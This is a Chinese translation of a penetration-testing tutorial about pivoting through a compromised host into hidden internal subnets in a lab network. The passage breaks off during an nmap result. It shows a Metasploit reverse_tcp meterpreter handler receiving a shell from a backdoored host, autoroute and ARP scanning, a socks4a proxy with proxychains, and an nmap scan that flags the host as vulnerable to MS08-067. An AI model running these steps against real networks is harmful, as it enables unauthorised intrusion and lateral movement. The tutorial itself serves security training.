# 【技术分享】多重转发渗透隐藏内网
##### 译文声明
本文是翻译文章，文章来源：pentest.blog
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
作者：[quanyechavshuo](http://bobao.360.cn/member/contribute?uid=1255579132)
预估稿费：150RMB
投稿方式：发送邮件至[linwei#360.cn](mailto:PI:EMAIL)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿
**0x00 About**
****
内网机器如下：
说明:
1)Attacker为攻击者,有一个网卡,网段为172.16.0.0,Attacker系统为kali系统
2)RD为第一个已经渗透的目标,有两块网卡,对应172.16.0.0和7.7.7.0两个网段
3)JC有两块网卡,对应7.7.7.0和8.8.8.0两个网段,JC有ms08-067和efs bof两个漏洞,可getshell
4)SK有一块网卡,对应8.8.8.0网段,SK有vsftpd的漏洞,可getshell
5)起初Attacker只拿到RD的msf的shell,对于目标内网情况一无所知,也不知道存在7.7.7.0和8.8.8.0这两个隐藏的网段
6)目标是准备通过RD来渗透内网中7.7.7.0和8.8.8.0两个隐藏的网段
**0x01 Step1**
Attacker在RD上通过webshell运行了一个reverse类型的后门,然后操作如下:
    msf > use exploit/multi/handler 
    msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf exploit(handler) > set LHOST 172.16.0.20 
    LHOST => 172.16.0.20msf exploit(handler) > set LPORT 1234
    LPORT => 1234msf exploit(handler) > run
    [*] Started reverse TCP handler on 172.16.0.20:1234 
    [*] Starting the payload handler...
    [*] Sending stage (957487 bytes) to 172.16.0.11
    [*] Meterpreter session 2 opened (172.16.0.20:1234 -> 172.16.0.11:49162)meterpreter > ifconfig
    Interface  1============
    Name         : Software Loopback Interface 1Hardware MAC : 00:00:00:00:00:00MTU          : 4294967295IPv4 Address : 127.0.0.1IPv4 Netmask : 255.0.0.0IPv6 Address : ::1IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
    Interface 11============
    Name         : Intel(R) PRO/1000 MT Desktop Adapter
    Hardware MAC : 08:00:27:e1:3f:af
    MTU          : 1500IPv4 Address : 172.16.0.11IPv4 Netmask : 255.255.255.0Interface 19============
    Name         : Intel(R) PRO/1000 MT Desktop Adapter #2Hardware MAC : 08:00:27:7f:3c:fe
    MTU          : 1500IPv4 Address : 7.7.7.11IPv4 Netmask : 255.255.255.0
**  
**
**0x02 Step2**
发现RD有两块网卡后,想办法渗透另一个网段7.7.7.0,首先要添加路由[不添加路由也可以直接用meterpreter shell中的模块访问
到7.7.7.x网段,添加路由的目的是为了使得msf模块可以访问到7.7.7.x网段],meterpreter
shell可以访问到7.7.7.x网段,msf 中的模块不能访问到7.7.7.x网段,msf中的模块所处的ip是攻击者的ip,meterpreter
shell所处的ip是RD的ip.在meterpreter中
添加路由的目的是为了给msf模块作代理,也即给Attacker作代理,但是只能给Attacker的msf模块作代理,要想给Attacker的其他
应用程序作代理,则需要在meterpreter添加路由后再运行msf的开启sock4的模块,然后再用proxychains来设置Attacker的其他
应用程序的代理为msf的开启sock4代理模块中设置的代理入口。
操作如下:
    meterpreter > run autoroute -s 7.7.7.0/24[*] Adding a route to 7.7.7.0/255.255.255.0...
    [+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11[*] Use the -p option to list all active routes
    meterpreter > run autoroute -p
    Active Routing Table
    ====================
     Subnet Netmask Gateway
     ------ ------- ------- 7.7.7.0 255.255.255.0 Session 2meterpreter >
然后开始扫描7.7.7.0网段,操作如下:
    meterpreter > run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24[*] Running module against DISCORDIA
    [*] ARP Scanning 7.7.7.0/24[*]     IP: 7.7.7.11 MAC 08:00:27:7f:3c:fe (CADMUS COMPUTER SYSTEMS)
    [*]     IP  7.7.7.12 MAC 08:00:27:3a:b2:c1 (CADMUS CIMPUTER SYSTEMS)
    [*]     IP: 7.7.7.20 MAC 08:00:27:fa:a0:c5 (CADMUS COMPUTER SYSTEMS)
    [*]     IP: 7.7.7.255 MAC 08:00:27:3f:2a:b5 (CADMUS COMPUTER SYSTEMS)
    meterpreter >
arp_scanner不太够用,不能扫到端口信息[此时也可用msf自带的其他可以扫描端口的模块如auxiliary/scanner/portscan/tcp来扫
描,因为前面添加了路由,使得msf中的模块可以用meterpreter作为代理访问到7.7.7.x网段],于是用Attacker本机的nmap来扫[可以
更完全的扫描,nmap应该比msf中的扫描模块强大],首先在RD上开sockets4代理,然后用proxychains设置nmap的代理为msf模块开
启的Attacker的1080端口提供的代理,操作如下:
    meterpreter > background 
    [*] Backgrounding session 2...
    msf > use auxiliary/server/socks4a 
    msf auxiliary(socks4a) > show options 
    Module options (auxiliary/server/socks4a):
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------       SRVHOST  0.0.0.0          yes       The address to listen on
       SRVPORT  1080             yes       The port to listen on.
    Auxiliary action:
       Name   Description
       ----   -----------       Proxy  
    msf auxiliary(socks4a) > set srvhost 172.16.0.20
    srvhost => 172.16.0.20msf auxiliary(socks4a) > run
    [*] Auxiliary module execution completed
    [*] Starting the socks4a proxy server
    msf auxiliary(socks4a) > netstat -antp | grep 1080
    [*] exec: netstat -antp | grep 1080
    tcp        0      172.16.0.20:1080            0.0.0.0:*               LISTEN      3626/ruby       
    msf auxiliary(socks4a) >
proxychains设置/etc/proxychains.conf如下:
    [ProxyList]# add proxy here ...# meanwile# defaults set to "tor"#socks4  127.0.0.1 9050socks4  172.16.0.20 1080
nmap扫描如下:
    root@kali:~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20ProxyChains-3.1 (http://proxychains.sf.net)Starting Nmap 7.25BETA1 ( https://nmap.org )|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:445-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:80-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:135-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:139-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:135-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:139-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:445-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:139-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:135-<><>-OK
    |S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:445-<><>-OK
    Nmap scan report for 7.7.7.20Host is up (0.17s latency).
    PORT     STATE    SERVICE      VERSION
    22/tcp   open     ssh          Bitvise WinSSHD 7.16 (FlowSsh 7.15; protocol 2.0)80/tcp   closed   http         Easy File Sharing Web Server httpd 6.9
    135/tcp  open     msrpc        Microsoft Windows RPC
    139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp  open     microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003
    Host script results:
    | smb-vuln-ms08-067: 
    |   VULNERABLE:
    |   Microsoft Windows system vulnerable to remote code execution (MS08-067)|     State: VULNERABLE
    |     IDs: CVE:CVE-2008-4250
    |          The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
    |          Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
    |          code via a crafted RPC request that triggers the overflow during path canonicalization.
    | 
    |     Disclosure date: 2008-10-23
    |     References: